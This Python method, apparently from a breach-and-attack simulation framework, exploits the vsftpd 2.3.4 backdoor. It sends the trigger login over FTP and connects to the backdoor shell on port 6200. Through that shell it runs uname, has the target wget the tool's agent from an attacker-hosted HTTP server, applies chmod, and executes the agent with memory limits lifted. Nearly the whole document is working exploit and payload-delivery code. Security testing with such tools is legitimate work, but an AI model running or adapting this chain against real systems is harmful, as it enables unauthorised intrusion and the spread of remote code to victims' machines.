    def _exploit_host(self):
        LOG.info("Attempting to trigger the Backdoor..")
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if self.socket_connect(ftp_socket, self.host.ip_addr, FTP_PORT):
            ftp_socket.recv(RECV_128).decode('utf-8')

        if self.socket_send_recv(ftp_socket, USERNAME + b'\n'):
            time.sleep(FTP_TIME_BUFFER)
            self.socket_send(ftp_socket, PASSWORD + b'\n')
            ftp_socket.close()
            LOG.info('Backdoor Enabled, Now we can run commands')
        else:
            LOG.error('Failed to trigger backdoor on %s', self.host.ip_addr)
            return False

        LOG.info('Attempting to connect to backdoor...')
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if self.socket_connect(backdoor_socket, self.host.ip_addr, BACKDOOR_PORT):
            LOG.info('Connected to backdoor on %s:6200', self.host.ip_addr)

        uname_m = str.encode(UNAME_M + '\n')
        response = self.socket_send_recv(backdoor_socket, uname_m)

        if response:
            LOG.info('Response for uname -m: %s', response)
            if '' != response.lower().strip():
                # command execution is successful
                self.host.os['machine'] = response.lower().strip()
                self.host.os['type'] = 'linux'
        else:
            LOG.info("Failed to execute command uname -m on victim %r ", self.host)

        src_path = get_target_monkey(self.host)
        LOG.info("src for suitable monkey executable for host %r is %s", self.host, src_path)

        if not src_path:
            LOG.info("Can't find suitable monkey executable for host %r", self.host)
            return False

        # Create a http server to host the monkey
        http_path, http_thread = HTTPTools.create_locked_transfer(self.host, src_path)
        dropper_target_path_linux = self._config.dropper_target_path_linux
        LOG.info("Download link for monkey is %s", http_path)

        # Upload the monkey to the machine
        monkey_path = dropper_target_path_linux
        download_command = WGET_HTTP_UPLOAD % {'monkey_path': monkey_path, 'http_path': http_path}
        download_command = str.encode(str(download_command) + '\n')
        LOG.info("Download command is %s", download_command)
        if self.socket_send(backdoor_socket, download_command):
            LOG.info('Monkey is now Downloaded ')
        else:
            LOG.error('Failed to download monkey at %s', self.host.ip_addr)
            return False

        http_thread.join(DOWNLOAD_TIMEOUT)
        http_thread.stop()

        # Change permissions
        change_permission = CHMOD_MONKEY % {'monkey_path': monkey_path}
        change_permission = str.encode(str(change_permission) + '\n')
        LOG.info("change_permission command is %s", change_permission)
        backdoor_socket.send(change_permission)
        T1222Telem(ScanStatus.USED, change_permission, self.host).send()

        # Run monkey on the machine
        parameters = build_monkey_commandline(self.host, get_monkey_depth() - 1)
        run_monkey = RUN_MONKEY % {'monkey_path': monkey_path, 'monkey_type': MONKEY_ARG, 'parameters': parameters}

        # Set unlimited to memory
        # we don't have to revert the ulimit because it just applies to the shell obtained by our exploit
        run_monkey = ULIMIT_V + UNLIMITED + run_monkey
        run_monkey = str.encode(str(run_monkey) + '\n')
        time.sleep(FTP_TIME_BUFFER)
        if backdoor_socket.send(run_monkey):
            LOG.info("Executed monkey '%s' on remote victim %r (cmdline=%r)", self._config.dropper_target_path_linux,
                     self.host, run_monkey)
            self.add_executed_cmd(run_monkey)
            return True
        else:
            return False